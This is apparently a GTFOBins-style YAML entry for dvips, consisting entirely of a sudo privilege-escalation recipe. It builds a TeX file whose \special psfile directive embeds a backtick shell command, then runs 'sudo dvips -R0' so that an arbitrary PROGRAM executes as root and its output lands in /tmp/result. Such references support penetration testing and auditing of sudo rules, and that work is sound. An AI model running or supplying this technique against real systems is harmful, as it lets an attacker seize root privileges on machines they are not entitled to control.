functions:
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \begin{document}" > file.tex
        echo '$$\hbox to5cm{\vbox to5cm{\vfil\special{psfile="`PROGRAM > /tmp/result"}}\hfill}$$' >> file.tex
        echo "\end{document}" >> file.tex
        tex -interaction=nonstopmode file.tex && sudo dvips -R0 file.dvi
        cat /tmp/result
